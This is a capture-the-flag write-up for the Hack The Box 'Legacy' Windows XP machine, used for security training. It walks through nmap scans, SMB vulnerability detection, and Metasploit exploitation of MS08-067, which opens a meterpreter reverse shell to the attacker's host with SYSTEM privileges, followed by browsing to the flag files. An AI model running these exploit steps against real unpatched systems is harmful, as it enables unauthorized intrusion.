## Default Information
IP address: 10.10.10.4\
OS : Windows

## Enumeration
Lets start with running a network scan on the IP address using ```NMAP``` to identify the open ports and the services running on the open ports (NOTE: This might take up quite some time)
* sV : service detection
* sC : Run default nmap scripts
* A : identify the OS behind each ports
* -p- : scan all ports
```code 
sudo nmap -sC -sV -A -p- -T4 10.10.10.4 -vv
```

From the output of ```NMAP```, we are able to obtain the following information about the open ports:
| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 139	| netbios-ssn | Microsoft Windows netbios-ssn | Open |
| 435	| microsoft-ds | Windows XP microsoft-ds | Open |
| 3389	| ms-wbt-server | NIL | Closed |

Apart from that, the output of ```NMAP``` also reveals that there is a SMB service running on the IP address, with a possibility that ```SMB v1``` is used and running on ```Microsoft XP```
```code
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-08-09T17:47:12+03:00
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
```

## Discovery
Knowing that ports 139 and 435 are running SMB services, we will run a ```nmap``` script to check for SMB vulnerabilities
* --script : Specify the script to scan
* -p : Specify the ports to run the scan on
```code
sudo nmap --script smb-vuln* -p139,435 10.10.10.4 -vv
```

From the output, we know that the ports are vulnerable to ```CVE-2008-4250/MS08-067``` and ```CVE-2017-0143/MS17-010```
```code
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: SMB: Failed to receive bytes: ERROR
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

## Exploitation
### CVE-2008-4250
For ```CVE-2008-4250```, I will use meterpreter to exploit the vulnerability (Cant seem to find any working exploit:(). After the exploit, we realise that we have gained access to the SMB server with root privileges
```code
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.16.250
LHOST => 10.10.16.250
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.16.250:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.250:4444 -> 10.10.10.4:1028) at 2021-08-09 14:35:05 -0400
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
#### Obtaining user flag
```code
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\
meterpreter > cd Documents\ and\ Settings
meterpreter > pwd
C:\Documents and Settings
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john

meterpreter > cd john
meterpreter > ls
Listing: C:\Documents and Settings\john
=======================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-16 01:33:41 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2017-03-16 01:33:41 -0400  NTUSER.DAT.LOG
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 01:33:42 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-16 02:19:32 -0400  user.txt

meterpreter > cat user.txt
```
#### Obtaining system flag
```code
meterpreter > cd ..
meterpreter > cd ..
meterpreter > pwd
C:\Documents and Settings
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john

meterpreter > cd Administrator
meterpreter > ls
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-16 02:07:20 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2017-03-16 02:07:20 -0400  NTUSER.DAT.LOG
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 02:07:21 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-16 02:18:19 -0400  root.txt

meterpreter > cat root.txt
```
